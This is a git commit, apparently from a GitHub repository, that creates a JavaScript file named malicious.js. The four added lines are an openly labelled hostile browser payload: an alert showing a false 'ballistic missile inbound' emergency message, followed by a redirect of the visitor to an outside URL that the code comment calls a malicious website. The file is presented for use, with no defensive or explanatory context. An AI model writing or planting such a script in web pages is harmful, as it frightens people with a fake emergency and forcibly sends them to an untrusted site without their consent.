0f2fe018806aa0d8ebc5bd76778654a67e56a786
SwiftSearcher <161917019+SwiftSearcher@users.noreply.github.com>
2024-03-16 01:02:43 -0500

    Create malicious.js

---
+++ malicious.js
@@ -0,0 +1,4 @@
+// Display an alert box with a malicious message
+alert('BALLISTIC MISSILE INBOUND, PERPARE FOR BIG 0WCHIE');
+// Redirect the user to a malicious website
+window.location.href = 'https://subculture.com/robot/allteen.html';
